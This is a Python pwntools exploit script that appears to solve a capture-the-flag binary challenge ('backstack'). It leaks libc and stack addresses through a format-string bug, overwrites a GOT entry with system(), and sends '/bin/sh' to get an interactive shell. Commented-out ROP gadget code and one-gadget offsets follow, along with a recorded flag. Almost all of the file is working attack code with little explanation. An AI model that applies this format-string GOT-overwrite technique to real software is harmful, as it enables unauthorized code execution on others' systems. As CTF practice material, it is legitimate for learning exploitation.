from pwn import *
from sys import argv
context.log_level = 'debug'
# context.log_level = 'error'
libc = ELF('backstack/libc.so.6')
# print(hex(libc.symbols['__libc_start_call_main']))



if 'r' in argv:
    conn = remote('prob11.geekgame.pku.edu.cn', 10011)
    conn.sendlineafter(b'Please input your token: ', b'')
else:
    context.terminal = ['tmux','splitw','-h']
    conn = process('backstack/challenge2')
    gdb.attach(pidof(conn)[0],
                '''b *0x4012bd
                '''
                )

input_fmt = 14
ret_fmt = 21


# return to __libc_start_call_main+122
# also change the strlen got to convenient place...
system_addr_end = libc.functions['system'].address & 0xfff

leak_payload = f'%{ret_fmt}$p,%20$p,'.encode().ljust(16,b'A') + p64(0x404018)
# conn.sendlineafter(b'characters)\n', (leak_payload + f"%{0x10 * system_addr_end}c%{input_fmt+3}$hn".encode()).ljust(24, b'A') + p64(0x40401f)[:3])
# leak_content = conn.recvuntil(b'capture it?:\n').split(b'   ')[0].split(b'this is your flag: ')[1].decode()
conn.sendlineafter(b'characters)\n', leak_payload)
leak_content = conn.recvuntil(b'capture it?:\n').split(b'\nWhat will')[0].split(b'this is your flag: ')[1].decode()

# 20 should old rbp?
ret_addr, stack_addr = leak_content.strip().split(',')[0:2]
ret_addr = eval(ret_addr)
stack_addr = eval(stack_addr)
print(hex(ret_addr), hex(stack_addr))
# stack_ret_addr = stack_addr + 0x38

# !!this is measured
# stack_input2_addr = stack_addr - 384
stack_ret_addr = stack_addr - 0x188 + 0x78
print(hex(stack_ret_addr))

LIBC_BASE = ret_addr - 0x29d90
system_addr = LIBC_BASE + libc.functions['system'].address
bin_sh_addr = LIBC_BASE + 0x1d8698


# set puts got to system / execv
setvbuf_got_addr = 0x404030
onegadget_list = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]

# THIS IS TRICKY: fmt number changed due to different location to write
comeback_payload = lambda hh, addr: f"%{hh}c%{input_fmt - 8 + 2}$n".encode().ljust(16, b'A') + p64(addr)[:len(hex(addr))-2]
# startup_payload = lambda hh, addr: f"%{hh}c%{input_fmt + 2}$ln".encode().ljust(16, b'A') + p64(addr)
# !!come to _start would work, but main not???

print('puts: ', hex(LIBC_BASE + libc.functions['puts'].address))
print('system: ', hex(LIBC_BASE + libc.functions['system'].address))

# off by one to make got puts->system
print(hex(system_addr & 0xffffffff))

# if system_addr & 0xff000000 == 0:
# conn.sendline(comeback_payload((system_addr & 0xffffffff), 0x404019))
payload = f"%{system_addr & 0xff}c%{input_fmt + 2}$hhn%{((system_addr & 0xffff00)//256) - (system_addr & 0xff)}c%{input_fmt - 8 + 3}$hn".encode().ljust(24,b'A') + p64(0x404019)
conn.sendline(payload)
# conn.sendline(b'dummy')
conn.recvuntil(b'flag again? :')
# try comeback to _start?
conn.sendline(b'/bin/sh')
# flag{dala0_Die_die_w0_ReAL_maSt3r_h3LP}
conn.interactive()

# else:

#     print('bad luck')
#     conn.close()

# second loop: start to write shellcode 

# print([f for f in libc.functions if 'str' in f])

# find a far writable area on stack...
ret_gadget = 0x401304
pop_rbp = 0x40119d
pop_rcx_rbx = 0x108b14 + LIBC_BASE
pop_rsp = 0x401303
pop_rdi = 0x2a3e5 + LIBC_BASE

# find empty page
# ROP_ADDR = 0x405050
# ROP_SC = p64(ret_gadget) * 0 + p64(pop_rbp) + p64(0) + p64(pop_rcx_rbx) + p64(0) + p64(0) + p64(onegadget_list[0] + LIBC_BASE)



# for i in range(0, len(ROP_SC), 2):
#     content = int.from_bytes(ROP_SC[i:i+2], 'little')
#     leak_payload = f'%{ret_fmt}$p,%20$p'.encode()
#     conn.sendlineafter(b'characters)\n', leak_payload)
#     leak_content = conn.recvuntil(b'capture it?:\n').split(b'\nWhat will')[0].split(b'this is your flag: ')[1].decode()
#     # 20 should old rbp?
#     ret_addr, stack_addr = leak_content.strip().split(',')
#     ret_addr = eval(ret_addr)
#     stack_addr = eval(stack_addr)
#     stack_ret_addr = stack_addr - 0x188 + 0x78
#     # write ROP_SC
#     comeback_payload = lambda hh, addr: f"%{hh}c%{input_fmt - 8 + 2}$p".encode().ljust(16, b'A') + p64(addr)
#     conn.sendline(comeback_payload(content, ROP_ADDR + i))

#     conn.recvuntil(b'flag again? :')
#     # try comeback to _start?
#     conn.sendline(b'A'*0x38 + p64(0x4010d0))
#     conn.recvuntil(b'luck~:)\n')



